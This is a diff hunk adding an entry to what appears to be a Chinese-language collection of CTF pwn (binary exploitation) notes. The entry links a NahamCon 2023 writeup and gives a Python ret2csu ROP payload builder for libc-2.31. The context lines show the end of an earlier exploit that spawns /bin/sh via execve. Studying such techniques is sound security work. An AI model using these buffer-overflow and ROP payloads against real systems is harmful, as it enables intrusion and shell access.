@@ -970,3 +970,22 @@ sc = jmpsc + b"\x00" * (0x50 - len(jmpsc)) + realsc
   rop.dup2()
   rop.execve(next(libc.search(b"/bin/sh")), 0, 0)
   ```
+86. [all patched up](https://github.com/M0ngi/CTF-Writeups/tree/main/2023/Nahamcon/pwn/all%20patched%20up)
+- [ret2csu](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#ret2csu)(万能gadget)实战。其实wp里用的不是ret2csu，是我用了后发现和ctf wiki里有一点不一样，参数的顺序不一致。仍然可以套ctf wiki里的模板，但是要自己根据libc的版本更换参数位置。此题是libc-2.31,顺序为：
+```py
+def csu(rbx, rbp, r12, r13, r14, r15, last):
+    # pop rbx,rbp,r12,r13,r14,r15
+    # rbx should be 0,
+    # rbp should be 1,enable not to jump
+    # r15 should be the function we want to call
+    # rdi=edi=r12d
+    # rsi=r13
+    # rdx=r14
+    payload = b'a' * bof_offset
+    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
+        r13) + p64(r14) + p64(r15)
+    payload += p64(csu_front_addr)
+    payload += b'a' * 0x38 #这个是固定的
+    payload += p64(last)
+    p.sendline(payload)
+```
